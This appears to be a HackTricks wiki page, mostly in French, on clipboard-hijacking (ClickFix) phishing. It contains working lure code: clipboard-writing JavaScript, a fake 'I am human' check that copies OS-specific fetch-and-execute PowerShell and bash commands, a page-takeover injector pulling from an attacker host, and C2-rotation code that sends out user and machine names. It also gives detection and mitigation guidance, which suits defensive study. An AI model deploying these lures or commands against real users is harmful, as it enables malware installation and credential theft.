# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Ne collez jamais quelque chose que vous n'avez pas copié vous-même." – conseil ancien mais toujours valable

## Présentation

Clipboard hijacking – also known as *pastejacking* – abuse le fait que les utilisateurs copient-collent régulièrement des commandes sans les vérifier. Une page web malveillante (ou tout contexte compatible JavaScript tel qu'une application Electron ou Desktop) place de manière programmatique du texte contrôlé par l'attaquant dans le presse-papiers du système. Les victimes sont encouragées, généralement par des instructions d'ingénierie sociale soigneusement conçues, à appuyer sur **Win + R** (boîte de dialogue Exécuter), **Win + X** (Quick Access / PowerShell), ou ouvrir un terminal et *coller* le contenu du presse-papiers, exécutant immédiatement des commandes arbitraires.

Parce qu'aucun fichier n'est téléchargé et aucune pièce jointe n'est ouverte, la technique contourne la plupart des contrôles de sécurité des e-mails et du contenu web qui surveillent les pièces jointes, macros ou l'exécution directe de commandes. L'attaque est donc populaire dans les campagnes de phishing distribuant des familles de malware de commodité telles que NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## Boutons "Copy" forcés et payloads cachés (macOS one-liners)

Certains infostealers macOS clonent des sites d'installateurs (p. ex., Homebrew) et **forcent l'utilisation d'un bouton “Copy”** afin que les utilisateurs ne puissent pas sélectionner uniquement le texte visible. L'entrée du presse-papiers contient la commande d'installation attendue plus un payload Base64 ajouté (p. ex., `...; echo <b64> | base64 -d | sh`), de sorte qu'un seul collage exécute les deux étapes tandis que l'interface masque l'étape supplémentaire.

## Preuve de concept JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Les campagnes plus anciennes utilisaient `document.execCommand('copy')`, les plus récentes reposent sur la **Clipboard API** asynchrone (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. L'utilisateur visite un site typosquatté ou compromis (e.g. `docusign.sa[.]com`)
2. Le JavaScript **ClearFake** injecté appelle une fonction utilitaire `unsecuredCopyToClipboard()` qui place silencieusement dans le clipboard un one-liner PowerShell encodé en Base64.
3. Les instructions HTML indiquent à la victime : *"Appuyez sur **Win + R**, collez la commande et appuyez sur Entrée pour résoudre le problème."*
4. `powershell.exe` s'exécute, télécharge une archive qui contient un exécutable légitime plus une DLL malveillante (classic DLL sideloading).
5. Le loader décrypte des étapes supplémentaires, injecte shellcode et installe la persistence (e.g. scheduled task) – exécutant finalement NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemple de chaîne NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart légitime) cherche `msvcp140.dll` dans son répertoire.
* La DLL malveillante résout dynamiquement les API avec **GetProcAddress**, télécharge deux binaires (`data_3.bin`, `data_4.bin`) via **curl.exe**, les déchiffre en utilisant une rolling XOR key `"https://google.com/"`, injecte le shellcode final et décompresse **client32.exe** (NetSupport RAT) dans `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Télécharge `la.txt` avec **curl.exe**
2. Exécute le JScript downloader dans **cscript.exe**
3. Récupère un payload MSI → dépose `libcef.dll` à côté d'une application signée → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
L'appel **mshta** lance un script PowerShell caché qui récupère `PartyContinued.exe`, extrait `Boat.pst` (CAB), reconstruit `AutoIt3.exe` via `extrac32` et concaténation de fichiers, et exécute enfin un script `.a3x` qui exfiltre les identifiants de navigateur vers `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Certaines campagnes ClickFix évitent complètement les téléchargements de fichiers et demandent aux victimes de coller un one‑liner qui récupère et exécute JavaScript via WSH, le persiste, et fait tourner le C2 quotidiennement. Exemple de chaîne observée :
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Principales caractéristiques
- URL obfusquée inversée à l'exécution pour déjouer une inspection superficielle.
- JavaScript s'installe de manière persistante via un Startup LNK (WScript/CScript), et sélectionne le C2 selon le jour courant – permettant une rotation rapide de domaines.

Fragment JS minimal utilisé pour faire tourner les C2s en fonction de la date:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La phase suivante déploie généralement un loader qui établit la persistance et récupère un RAT (e.g., PureHVNC), souvent en appliquant du certificate pinning TLS sur un certificat codé en dur et en découpant le trafic.

Detection ideas specific to this variant
- Arbre de processus: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Artefacts de démarrage: LNK dans `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoquant WScript/CScript avec un chemin JS sous `%TEMP%`/`%APPDATA%`.
- Télémétrie Registry/RunMRU et ligne de commande contenant `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Instances répétées de `powershell -NoProfile -NonInteractive -Command -` avec de gros payloads sur stdin pour alimenter des scripts longs sans longues lignes de commande.
- Scheduled Tasks qui exécutent ensuite des LOLBins tels que `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sous une tâche/chemin ressemblant à un updater (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Corréler clipboard write events suivis d’un collage Win+R puis d’une exécution immédiate de `powershell.exe`.

Les Blue-teams peuvent combiner clipboard, process-creation et registry telemetry pour localiser précisément les abus de pastejacking :

* Registre Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserve un historique des commandes **Win + R** – rechercher des entrées Base64 / obfusquées inhabituelles.
* ID d'événement de sécurité **4688** (Process Creation) où `ParentImage` == `explorer.exe` et `NewProcessName` dans { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** pour des créations de fichiers sous `%LocalAppData%\Microsoft\Windows\WinX\` ou dans des dossiers temporaires juste avant l'événement 4688 suspect.
* EDR clipboard sensors (if present) – corréler `Clipboard Write` suivi immédiatement par un nouveau processus PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Les campagnes récentes produisent en masse de fausses pages de vérification CDN/browser ("Just a moment…", IUAM-style) qui contraignent les utilisateurs à copier des commandes spécifiques à leur OS depuis leur clipboard vers des consoles natives. Cela pivote l’exécution hors du bac à sable du navigateur et fonctionne sur Windows et macOS.

Key traits of the builder-generated pages
- Détection de l'OS via `navigator.userAgent` pour adapter les payloads (Windows PowerShell/CMD vs. macOS Terminal). Décoys/no-ops optionnels pour les OS non pris en charge afin de préserver l'illusion.
- Copie automatique dans le clipboard lors d'actions UI bénignes (checkbox/Copy) tandis que le texte visible peut différer du contenu du clipboard.
- Blocage mobile et un popover avec instructions pas-à-pas : Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Obfuscation optionnelle et injecteur monofichier pour écraser le DOM d’un site compromis avec une UI de vérification stylée Tailwind (aucun nouvel enregistrement de domaine requis).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence de la première exécution
- Utilisez `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` pour que l'exécution continue après la fermeture du terminal, réduisant les artefacts visibles.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Idées de détection et de hunting spécifiques aux leurres de type IUAM
- Web : Pages qui lient Clipboard API à des widgets de vérification ; discordance entre le texte affiché et la payload du presse-papiers ; `navigator.userAgent` branching ; Tailwind + single-page replace dans des contextes suspects.
- Windows endpoint : `explorer.exe` → `powershell.exe`/`cmd.exe` peu de temps après une interaction avec le navigateur ; installateurs batch/MSI exécutés depuis `%TEMP%`.
- macOS endpoint : Terminal/iTerm lançant `bash`/`curl`/`base64 -d` avec `nohup` à proximité d'événements navigateur ; jobs en arrière-plan survivant à la fermeture du terminal.
- Corréler `RunMRU` Win+R history et les écritures dans le presse-papiers avec la création ultérieure de processus console.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mesures d'atténuation

1. Durcissement du navigateur – désactiver l'accès en écriture au presse-papiers (`dom.events.asyncClipboard.clipboardItem` etc.) ou exiger un geste utilisateur.
2. Security awareness – apprendre aux utilisateurs à *type* les commandes sensibles ou à les coller d'abord dans un éditeur de texte.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control pour bloquer les one-liners arbitraires.
4. Contrôles réseau – bloquer les requêtes sortantes vers les domaines connus de pastejacking et de malware C2.

## Astuces associées

* **Discord Invite Hijacking** abuse souvent la même approche ClickFix après avoir attiré les utilisateurs dans un serveur malveillant :

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Références

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
